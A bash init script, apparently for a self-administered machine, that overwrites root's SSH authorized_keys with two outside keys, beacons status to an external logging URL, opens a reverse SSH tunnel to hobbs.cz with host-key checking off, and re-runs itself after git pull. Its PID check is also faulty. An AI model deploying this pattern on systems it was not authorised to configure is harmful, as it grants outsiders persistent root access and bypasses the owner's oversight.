log() {
  encoded=$(echo "$1" | sed 's/ /%20/g; s/\//%2F/g; s/:/%3A/g; s/@/%40/g; s/\[/%5B/g; s/\]/%5D/g')
  curl -s "https://recordme.hobbs.cz/LOG-$encoded" >/dev/null 2>&1
}

log "INIT_START"

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqQKJYwnzlx9kFuw+dzsLyqw6qUfd6EQsGHv94RXoV2B4Y/MOI7kQpMau2d7uuE4gifmcCuY8tZM6hy53WwGeZicAkgbG+8d5xlTOCaWlOT7vSIVF0H8seYEW0ZMfIa/RLQjyGjuSvPkLpEeKoMZ2/6Qxa10L4ZuHHlRA+BJrV3MI8Ybmt75EA7eAzBvj1J5nQxZKvOQZsYV+HZ/ex4snNAUOH3Dkc4x2txGJIzRR5qdahMO18uRw4hvwNRO8gUPTQkOomDxLC1PktKVPlxY3ObEMqLi/y5S0HDftASC08N5Pxc21kr1sAW3c1bbtlLpbIoVbavaZCE4jjETkdLaeZ timothy@yoga" > /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCOWkFsstua5kZ/cZKLPq1yNRUvcvpHpxegXmrOcWJTCYNr/KOQ7NJnarvRhFDVNIO8zxmE8+cYqufcckmv3BWbKFLvPRVOw3ECQQ1zqa5m4zOX6uMV9Zjm12DgzvIEx6dMROPlZoC1k828Z7Ocxb//uxawV2Mgz4QtRkILJNEe3N7fPWIKv0vZnT6EbgnF5kRbzs9UQYCTZUjbM2u6VuBlIyGqB6cW7x4QM0uucmTw9dJEuACAVcem1YVrfTX5ByCH/Pal5pRRXvke0Aly8+iVhNmnfh4Ywo/BSXmdztDnxOQSYtLjz1Ik646FDXg1mz1LRUrj1SygASbNenzS7lnT tomaszigo" >> /root/.ssh/authorized_keys
log "KEYS_WRITTEN"

# Check if reverse user key exists
if [ -f /root/.ssh/id_rsa ]; then
  log "KEY_EXISTS"
else
  log "KEY_MISSING-/root/.ssh/id_rsa"
fi

# Test SSH connection with verbose output, capture errors
log "SSH_TUNNEL_STARTING"
ssh_output=$(ssh -v -o StrictHostKeyChecking=no -o ServerAliveInterval=20 -o ConnectTimeout=10 -N -R 10022:localhost:22 reverse@hobbs.cz 2>&1 &)
ssh_pid=$!
sleep 5

# Check if SSH is still running
if kill -0 $ssh_pid 2>/dev/null; then
  log "SSH_TUNNEL_RUNNING_PID-$ssh_pid"
else
  wait $ssh_pid
  exit_code=$?
  log "SSH_TUNNEL_FAILED_EXIT-$exit_code"
fi

sleep 60
log "RESTARTING"
git pull
exec bash INIT.sh
